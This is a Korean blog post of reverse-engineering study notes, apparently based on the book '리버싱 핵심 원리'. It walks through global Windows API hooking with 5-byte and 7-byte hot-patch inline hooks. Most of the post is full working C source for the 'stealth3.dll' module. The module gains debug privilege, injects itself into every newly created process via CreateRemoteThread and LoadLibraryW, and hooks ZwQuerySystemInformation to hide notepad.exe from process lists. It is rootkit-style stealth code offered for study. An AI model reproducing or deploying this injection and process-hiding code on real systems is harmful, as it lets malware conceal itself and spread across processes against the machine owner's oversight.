---
layout: article
title: "[Rev]API Hooking(Global Hooking)"
key: 20190307
tags:
  - Reversing
toc: true
mathjax: true
mathjax_autoNumber: true
published : true
---

# [+] Windows Hooking(5)

<!--more-->

## [+] Global API Hooking

바로 전 포스팅에서 나왔던 `ZwQuerySystemInformation` 함수를 이용해서 글로벌 후킹을 어느정도 구현했었다. 그러나 새로 생성되는 프로세스에는 적용되지 않았었기 때문에 완벽한 글로벌 후킹으라고 할 수 없었다.

이번에는 이렇게 새로 생성되는 프로세스에도 후킹을 걸어 글로벌 후킹을 완성시켜본다.

책에 아주 중요한 말이 나온다. **후킹이 필요한 특정 API를 찾을 때 Low Level의 API를 후킹하는 것이 좋다.** 라는 말이 나온다. 예를 들어 프로세스 생성 시 사용되는 `CreateProcess`의 경우 Low Level API인 `ntdll.ZwResumeThread` API를 후킹하면 생성되는 프로세스들에 대한 문제가 해결된다. 

`CreateProcess` 함수를 이용해 간단히 프로그램을 짜고 해당 함수를 들어가 쭉 진행해보면 결국 마지막에 `ZwResumeThread` 함수가 호출되면 해당 프로세스가 최종 실행되는 것을 확인할 수 있다. ProcExp와 같은 모니터링 도구로 확인해보면 `ZwResumeThread`가 호출되기 전에도 프로세스는 생성되어 있지만 Suspend 상태인 것을 확인할 수 있다. 말 그대로 `Resume` 시켜주는 최종 함수인 것 같다.

## [+] Analysis

### stealth2.dll(CreateProcess Hooking)

해당 예제 파일은 `CreateProcess` API를 후킹하는 모듈이다.
천천히 또 분석을 시작해본다. 전체 소스코드를 제외한 기존 소스코드에서 변경된 부분만 분석한다.

#### Flow

먼저 전체적인 흐름을 본다. 전체적인 후킹 원리는 똑같다.

1. `ZwQuerySystemInformation` 후킹을 통해 모든 프로세스에 후킹 DLL을 삽입
2. 마찬가지로 새로 생성되는 프로세스에도 인젝션하기 위해 `CreateProcess` 함수를 후킹해둠
3. 프로세스를 생성하기 위해 `CreateProcess`를 호출
4. 변조된 5byte 코드로 인해 미리 생성해둔 `NewCreateProcess` 함수로 실행흐름이 변경
5. 언훅을 통해 원래의 `CreateProcess` 함수로 복원
6. 프로세스 생성하면 실행 흐름은 후킹 함수로 돌아옴
7. 리턴 받은 프로세스 핸들을 이용해 DLL 인젝션
8. 다른 프로세스 생성 시에도 과정을 반복하기 위해 다시 `hook_by_code` 를 이용해 5byte 변조

#### DllMain()

```c
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    char            szCurProc[MAX_PATH] = {0,};
    char            *p = NULL;

    // HideProc2.exe 프로세스에는 인젝션 되지 않도록 예외처리
    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
    p = strrchr(szCurProc, '\\');
    if( (p != NULL) && !_stricmp(p+1, "HideProc2.exe") )
        return TRUE;

    // change privilege
    SetPrivilege(SE_DEBUG_NAME, TRUE);

    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH : 
            // hook
            hook_by_code("kernel32.dll", "CreateProcessA", 
                         (PROC)NewCreateProcessA, g_pOrgCPA);
            hook_by_code("kernel32.dll", "CreateProcessW", 
                         (PROC)NewCreateProcessW, g_pOrgCPW);
            hook_by_code("ntdll.dll", "ZwQuerySystemInformation", 
                         (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);
            break;

        case DLL_PROCESS_DETACH :
            // unhook
            unhook_by_code("kernel32.dll", "CreateProcessA", 
                           g_pOrgCPA);
            unhook_by_code("kernel32.dll", "CreateProcessW", 
                           g_pOrgCPW);
            unhook_by_code("ntdll.dll", "ZwQuerySystemInformation", 
                           g_pOrgZwQSI);
            break;
    }

    return TRUE;
}
```

음 보니 이전 코드에서 후킹하는 함수만 달라졌으므로 패스한다. `hook_by_code` 함수를 이용해 `CreateProcessA(ASCII)` 와 `CreateProcessW(UNICODE)`를 후킹하고 프로세스를 숨기기 위해 `ZwQuerySystemInformation` API를 후킹한다.

#### NewCreateProcessA()

```c
BOOL WINAPI NewCreateProcessA(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
)
{
    BOOL bRet;
    FARPROC pFunc;

    // unhook
    unhook_by_code("kernel32.dll", "CreateProcessA", g_pOrgCPA);

    // original API 호출
    pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,
                                     lpCommandLine,
                                     lpProcessAttributes,
                                     lpThreadAttributes,
                                     bInheritHandles,
                                     dwCreationFlags,
                                     lpEnvironment,
                                     lpCurrentDirectory,
                                     lpStartupInfo,
                                     lpProcessInformation);

    // 생성된 자식 프로세스에 stealth2.dll 을 인젝션 시킴
    if( bRet )
        InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);

    // hook
    hook_by_code("kernel32.dll", "CreateProcessA", 
                 (PROC)NewCreateProcessA, g_pOrgCPA);

    return bRet;
}
```

약간 다른 점은 기존 `InjectDll` 함수를 호출할 때 현재 동작 중인 프로세스의 pid를 가져와 `OpenProcess`를 이용해 프로세스의 핸들 값을 반환받아 인젝션을 수행했다.

그러나 `CreateProcess` API를 호출하면 프로세스의 핸들을 그냥 가져올 수 있기 때문에 이를 이용해 인젝션을 수행한다.

이 외에는 사실 다른게 없기 때문에 여기서 끝!! 좋당
그러나 아직 분석할게 있다..

## [+] Hot Patch

기존의 코드패치에 대한 문제를 이야기하며 핫패치에 대한 내용이 나온다. 기존 코드패치의 경우 다음과 같은 과정이 존재한다.

```pseudocode
1. Hooking Process
{
 	dllinject(anotherprocess,hooking.dll)
}

2. Hooking Function
{
	case DLL_PROCESS_ATTACH:
    	byte patch(0xE5, &NewAPIFunction) 
 	
        4. NewAPIFunction(...)
        {
            (1). Unhook(5byte opcode 복원)
            (2). CALL APIFunction
            (3). Injection
            (4). Byte Patch(0xE5, &NewAPIFunction)
        }
}

3. another process(API patched)
{
    APIFunction(...) // 변조된 opcode로 인해 NewAPIFunction 호출
}
```

급하게 의사코드로 표현해봤는데...음. 어쨋든 여기서 문제가 되는 부분은 4번의 4개의 과정이다.

이게 문제가 될 수 있는게 훅과 언훅하는 과정에서 코드패치를 반복적으로 한다는 점이다. 이 때 멀티 스레드 환경의 경우, 어떠한 스레드가 코드를 실행하려 하는데 다른 스레드가 해당 코드에 쓰기를 시도하여 충돌이 발생할 수 있다. 그렇기 때문에 안정적인 후킹 방법이 필요하다고 한다.

그래서 안정적인 방법이라고 소개되는 것이 핫 패치(7byte code patch)다.

대부분 API 함수의 시작주소로 가서 명령어를 살펴보면 공통점이 존재한다. 처음 시작 인스트럭션이 `MOV EDI, EDI` 인 것과 그 위로 5개의 nop(0x90) 인스트럭션이 존재한다. (`0x 90 90 90 90 90 8B FF`)

이 7byte를 유심히 보면 사실 아무런 동작이 없는 명령어이다. `MOV EDI, EDI` 또한 `EDI` 레지스터의 값을 다시 `EDI`에 넣는 의미없는 명령어일뿐이다. 그 이유가 바로 핫픽스를 위해서인데, 이 때 바로 API 후킹을 통해 이루어진다. 핫패치(핫픽스)란 프로세스가 실행 중일 때 라이브러리를 프로세스 메모리에서 일시적으로 변경하는 기술이라고 한다. 

### Process

핫패치 방식의 동작원리는 다음과 같이 두 가지 특징을 이해해야 된다. 

```sh
77B913FB      90            NOP
77B913FC      90            NOP
77B913FD      90            NOP
77B913FE      90            NOP
77B913FF      90            NOP
77B91400 >    8BFF          MOV     EDI, EDI
----------------------------------------------
77B913FB    - E9 00EC478C   JMP     04010000
77B91400 >  ^ EB F9         JMP     SHORT kernel32.77B913FB
```

보면 5byte의 `NOP(0x90)` 명령을 `JMP xxxxxxxx(0xE9 xxxxxxxx)` 으로 변경한다. 그리고 2byte의 `MOV EDI, EDI(0x8B FF)` 명령을 `JMP SHORT(0x EB F9)` 로 변경한다.

이렇게 되면 점프를 두번해서 원하는 함수로 실행 흐름을 변경하게 된다. 이게 첫번째 특징이고 두번째 특징은 이렇게 7byte를 패치함으로써 바로 언훅/훅 과정을 반복 할 필요가 없다는 것 이다.

나도 순간 여기서 당황할뻔....; 자 기존 5byte 패치는 `MOV EDI, EDI(0x8B FF)` 명령부터 5byte를 패치했다. 그렇기 때문에 기존 함수의 명령이 깨져있다. 그러나 7byte 핫패치의 경우에는 의미없는 명령어 7byte만 패치했기 때문에 다시 원본 코드로 돌릴 필요가 없다. 원본 API를 호출할 때는 단순히 원래의 API시작주소+2를 해주면 정상적으로 원본 API가 실행되는 것이다.

깨달음의 기쁨이란 이런 것인가 싶다

다왔다 이제 이러한 핫패치 기법을 이용한 마지막 예제 파일인 `stealth3.dll`을 분석해 본다.

### stealth3.dll()

#### Flow

이번엔 전체 소스코드는 펼쳐놓고.. 기존 분석 외 새롭게 추가된 함수에 대해서만 분석을 진행한다.

```c
/* stealth3.dll */
#include "windows.h"
#include "stdio.h"
#include "tchar.h"

#define STR_MODULE_NAME					(L"stealth3.dll")
#define STR_HIDE_PROCESS_NAME			(L"notepad.exe")
#define STATUS_SUCCESS					(0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    BYTE Reserved1[52];
    PVOID Reserved2[3];
    HANDLE UniqueProcessId;
    PVOID Reserved3;
    ULONG HandleCount;
    BYTE Reserved4[4];
    PVOID Reserved5[11];
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, 
    PVOID SystemInformation, 
    ULONG SystemInformationLength, 
    PULONG ReturnLength);

typedef BOOL (WINAPI *PFCREATEPROCESSA)(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef BOOL (WINAPI *PFCREATEPROCESSW)(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

BYTE g_pOrgZwQSI[5] = {0,};

BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = {0xE9, 0, };
	PBYTE pByte;

	pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;
	if( pByte[0] == 0xE9 )
		return FALSE;

	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	memcpy(pOrgBytes, pFunc, 5);

	dwAddress = (DWORD)pfnNew - (DWORD)pFunc - 5;
	memcpy(&pBuf[1], &dwAddress, 4);

	memcpy(pFunc, pBuf, 5);

	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}

BOOL hook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew)
{
	FARPROC pFunc;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
    BYTE pBuf2[2] = { 0xEB, 0xF9 };
	PBYTE pByte;

	pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;
	if( pByte[0] == 0xEB )
		return FALSE;

	VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // 1. NOP (0x90)
	dwAddress = (DWORD)pfnNew - (DWORD)pFunc;
	memcpy(&pBuf[1], &dwAddress, 4);
	memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);
    
    // 2. MOV EDI, EDI (0x8BFF)
    memcpy(pFunc, pBuf2, 2);

	VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &dwOldProtect);

	return TRUE;
}

BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;

	pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;
	if( pByte[0] != 0xE9 )
		return FALSE;

	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	memcpy(pFunc, pOrgBytes, 5);

	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}

BOOL unhook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName)
{
    FARPROC pFunc;
    DWORD dwOldProtect;
    PBYTE pByte;
    BYTE pBuf[5] = { 0x90, 0x90, 0x90, 0x90, 0x90 };
    BYTE pBuf2[2] = { 0x8B, 0xFF };


    pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
    pByte = (PBYTE)pFunc;
    if( pByte[0] != 0xEB )
        return FALSE;

    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // 1. NOP (0x90)
    memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);
    
    // 2. MOV EDI, EDI (0x8BFF)
    memcpy(pFunc, pBuf2, 2);

    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

    return TRUE;
}

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) 
{
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid;

    if( !OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
			              &hToken) )
    {
        printf("OpenProcessToken error: %u\n", GetLastError());
        return FALSE;
    }

    if( !LookupPrivilegeValue(NULL,             // lookup privilege on local system
                              lpszPrivilege,    // privilege to lookup 
                              &luid) )          // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if( bEnablePrivilege )
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.
    if( !AdjustTokenPrivileges(hToken, 
                               FALSE, 
                               &tp, 
                               sizeof(TOKEN_PRIVILEGES), 
                               (PTOKEN_PRIVILEGES) NULL, 
                               (PDWORD) NULL) )
    { 
        printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
        return FALSE; 
    } 

    if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )
    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    } 

    return TRUE;
}

BOOL InjectDll2(HANDLE hProcess, LPCTSTR szDllName)
{
	HANDLE hThread;
	LPVOID pRemoteBuf;
	DWORD dwBufSize = (DWORD)(_tcslen(szDllName) + 1) * sizeof(TCHAR);
	FARPROC pThreadProc;

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, 
                                MEM_COMMIT, PAGE_READWRITE);
    if( pRemoteBuf == NULL )
        return FALSE;

	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName, 
                       dwBufSize, NULL);

	pThreadProc = GetProcAddress(GetModuleHandleA("kernel32.dll"), 
                                 "LoadLibraryW");
	hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                 (LPTHREAD_START_ROUTINE)pThreadProc, 
                                 pRemoteBuf, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);	

	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);

	CloseHandle(hThread);

	return TRUE;
}

NTSTATUS WINAPI NewZwQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, 
	PVOID SystemInformation, 
	ULONG SystemInformationLength, 
	PULONG ReturnLength)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
	char szProcName[MAX_PATH] = {0,};

	unhook_by_code("ntdll.dll", "ZwQuerySystemInformation", g_pOrgZwQSI);

	pFunc = GetProcAddress(GetModuleHandleA("ntdll.dll"), 
                           "ZwQuerySystemInformation");
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
             (SystemInformationClass, SystemInformation, 
              SystemInformationLength, ReturnLength);

	if( status != STATUS_SUCCESS )
		goto __NTQUERYSYSTEMINFORMATION_END;

	if( SystemInformationClass == SystemProcessInformation )
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		while(TRUE)
		{
            if(pCur->Reserved2[1] != NULL)
            {
                if(!_tcsicmp((PWSTR)pCur->Reserved2[1], STR_HIDE_PROCESS_NAME))
			    {
				    if(pCur->NextEntryOffset == 0)
					    pPrev->NextEntryOffset = 0;
				    else
					    pPrev->NextEntryOffset += pCur->NextEntryOffset;
			    }
			    else		
				    pPrev = pCur;	// 원하는 프로세스를 못 찾은 경우만 pPrev 세팅
            }

			if(pCur->NextEntryOffset == 0)
				break;

			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);
		}
	}

__NTQUERYSYSTEMINFORMATION_END:

	hook_by_code("ntdll.dll", "ZwQuerySystemInformation", 
                 (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);

	return status;
}

BOOL WINAPI NewCreateProcessA(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
)
{
    BOOL bRet;
    FARPROC pFunc;

    // original API 호출
    pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
    pFunc = (FARPROC)((DWORD)pFunc + 2);
    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,
                                     lpCommandLine,
                                     lpProcessAttributes,
                                     lpThreadAttributes,
                                     bInheritHandles,
                                     dwCreationFlags,
                                     lpEnvironment,
                                     lpCurrentDirectory,
                                     lpStartupInfo,
                                     lpProcessInformation);

    // 생성된 자식 프로세스에 stealth3.dll 을 인젝션 시킴
    if( bRet )
        InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);

    return bRet;
}

BOOL WINAPI NewCreateProcessW(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
)
{
    BOOL bRet;
    FARPROC pFunc;

    // original API 호출
    pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessW");
    pFunc = (FARPROC)((DWORD)pFunc + 2);
    bRet = ((PFCREATEPROCESSW)pFunc)(lpApplicationName,
                                     lpCommandLine,
                                     lpProcessAttributes,
                                     lpThreadAttributes,
                                     bInheritHandles,
                                     dwCreationFlags,
                                     lpEnvironment,
                                     lpCurrentDirectory,
                                     lpStartupInfo,
                                     lpProcessInformation);

    // 생성된 자식 프로세스에 stealth3.dll 을 인젝션 시킴
    if( bRet )
        InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);

    return bRet;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    char            szCurProc[MAX_PATH] = {0,};
    char            *p = NULL;

    // HideProc2.exe 프로세스에는 인젝션 되지 않도록 예외처리
    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
    p = strrchr(szCurProc, '\\');
    if( (p != NULL) && !_stricmp(p+1, "HideProc2.exe") )
        return TRUE;

    // change privilege
    SetPrivilege(SE_DEBUG_NAME, TRUE);

    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH : 
            // hook
            hook_by_hotpatch("kernel32.dll", "CreateProcessA", 
                             (PROC)NewCreateProcessA);
            hook_by_hotpatch("kernel32.dll", "CreateProcessW", 
                             (PROC)NewCreateProcessW);
            hook_by_code("ntdll.dll", "ZwQuerySystemInformation", 
                         (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);
            break;

        case DLL_PROCESS_DETACH :
            // unhook
            unhook_by_hotpatch("kernel32.dll", "CreateProcessA");
            unhook_by_hotpatch("kernel32.dll", "CreateProcessW");
            unhook_by_code("ntdll.dll", "ZwQuerySystemInformation", 
                           g_pOrgZwQSI);
            break;
    }

    return TRUE;
}
```

#### hook_by_hotpatch()

```c
BOOL hook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew)
{
	FARPROC pFunc;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
    BYTE pBuf2[2] = { 0xEB, 0xF9 };
	PBYTE pByte;

	pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;
	if( pByte[0] == 0xEB )
		return FALSE;

	VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // 1. NOP (0x90)
	dwAddress = (DWORD)pfnNew - (DWORD)pFunc;
	memcpy(&pBuf[1], &dwAddress, 4);
	memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);
    
    // 2. MOV EDI, EDI (0x8BFF)
    memcpy(pFunc, pBuf2, 2);

	VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &dwOldProtect);

	return TRUE;
}
```

```c
    // 1. NOP (0x90)
	dwAddress = (DWORD)pfnNew - (DWORD)pFunc;
	memcpy(&pBuf[1], &dwAddress, 4);
	memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);
    
    // 2. MOV EDI, EDI (0x8BFF)
    memcpy(pFunc, pBuf2, 2);

	VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &dwOldProtect);
```

**이 부분이 중요하다...한 20분 고민했다 멍청해서... 기존에 `dwAddress` 변수에는 `점프 할 주소 - 패치 할 위치 - 코드 사이즈(5byte)` 였는데 여기선 `점프 할 주소 -  패치 할 위치` 로 되어 있다. 이 값을 E9+xxxxxxxx opcode로 원본 API 시작주소에 패치해보면 가야하는 함수의 시작 주소보다 5byte 떨어져있다. 그래서 바로 아래 `memcpy(pFunc-5, pBuf)` 로 원본 API 시작 주소의 5byte 앞을 패치한다.**

**바로 nop 시작 위치부터 패치를 하는 것이다. 이렇게 되면 해당 opcode로 정확하게 원하는 함수 위치로 점프할 수 있다.**

**그 다음은  `pBuf2` 변수에 담긴 `0xEB, 0xF9` 를 원본 API의 시작주소부터 2byte 패치를 진행한다. 그러면 `MOV EDI, EDI`가 `JMP SHORT` 명령어로 패치가 되게 된다. 이렇게 총 7byte의 패치가 이루어지는 것이다.**

역시나 직접 짜보면서 출력하는게 최고다.

```c
#include <stdio.h>
#include <Windows.h>

typedef int (WINAPI *PFMESSAGEBOXA)(
	HWND hWnd, LPCSTR lpText,LPCSTR lpCaption,UINT uType);

void test2()
{
	FARPROC pFunc;
	pFunc=GetProcAddress(GetModuleHandleA("user32.dll"),"MessageBoxA");
	pFunc=(FARPROC)((DWORD)pFunc+2);
	((PFMESSAGEBOXA)pFunc)(NULL, "Hook!!!","Shh0ya", MB_OK);
	printf("\nCall Success\n");
	exit(0);
}

void main()
{
	FARPROC pFunc;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
    BYTE pBuf2[2] = { 0xEB, 0xF9 };
	PBYTE pByte;
	LPCSTR szDllName; LPCSTR szFuncName; PROC pfnNew; PBYTE pOrgBytes[5]={0,};
	szDllName="user32.dll";
	szFuncName="MessageBoxA";
	pfnNew=(PROC)test2;
	printf("test2() Address = %p\n",pfnNew);
	pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;
	if( pByte[0] == 0xEB )
		return;

	VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // 1. NOP (0x90)
	dwAddress = (DWORD)pfnNew - (DWORD)pFunc;
	printf("Relative JMP Address %X\n",dwAddress);
	memcpy(&pBuf[1], &dwAddress, 4);
	printf("Complete OPCODE = ");
	for(int i=0;i<sizeof(pBuf);i++)
	{
		if(i==0){printf("%X ",pBuf[i]);}
		else
		printf("%X",pBuf[i]);
	}
	printf("\nMessageBoxA(Org) NOP Start Address = %p",(LPVOID)((DWORD)pFunc-5));
	memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);
    
    // 2. MOV EDI, EDI (0x8BFF)
    memcpy(pFunc, pBuf2, 2);

	VirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &dwOldProtect);
	MessageBoxA(0,"hello","Shh0ya",MB_OK);
}
```

 실행하면 원하는 흐름대로 흘러가는걸 볼 수 있다. 디버깅을 통해 직접 패치되는 것도 확인하는게 좋다.

#### unhook_by_hotpatch()

```c
BOOL unhook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName)
{
    FARPROC pFunc;
    DWORD dwOldProtect;
    PBYTE pByte;
    BYTE pBuf[5] = { 0x90, 0x90, 0x90, 0x90, 0x90 };
    BYTE pBuf2[2] = { 0x8B, 0xFF };


    pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
    pByte = (PBYTE)pFunc;
    if( pByte[0] != 0xEB )
        return FALSE;

    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // 1. NOP (0x90)
    memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);
    
    // 2. MOV EDI, EDI (0x8BFF)
    memcpy(pFunc, pBuf2, 2);

    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

    return TRUE;
}
```

위의 코드는 단순히 언훅하기 위해 NOP 명령어와 MOV EDI, EDI 명령어를 복원하는 것이다.

#### NewCreateProcessA()

```c
BOOL WINAPI NewCreateProcessA(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
)
{
    BOOL bRet;
    FARPROC pFunc;

    // original API 호출
    pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
    pFunc = (FARPROC)((DWORD)pFunc + 2);
    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,
                                     lpCommandLine,
                                     lpProcessAttributes,
                                     lpThreadAttributes,
                                     bInheritHandles,
                                     dwCreationFlags,
                                     lpEnvironment,
                                     lpCurrentDirectory,
                                     lpStartupInfo,
                                     lpProcessInformation);

    // 생성된 자식 프로세스에 stealth3.dll 을 인젝션 시킴
    if( bRet )
        InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);

    return bRet;
}
```

원래의 `CreateProcess` API를 호출할 때 언훅과 다시 훅하는 과정 없이 한줄이 딱 들어간다.

```c
pFunc = (FARPROC)((DWORD)pFunc + 2);
```

바로 `CreateProcess` 시작 주소에서 2byte 뒤에 이어지는 실질적인 명령이 진행되며 정상적으로 원본 함수가 호출되게 된다.

이러한 안정적인 핫패치 방식에도 문제는 존재한다.
모든 API가 nop(5byte)+mov edi,edi(2byte)가 있다는 것은 아니다. 때문에 후킹할 함수에 대해 꼭 확인해보고 그에 맞는 5byte패치, 핫패치 등의 방식을 고려하여 사용해야 한다.

끝! 

# [+] Reference

1. ***리버싱 핵심 원리***



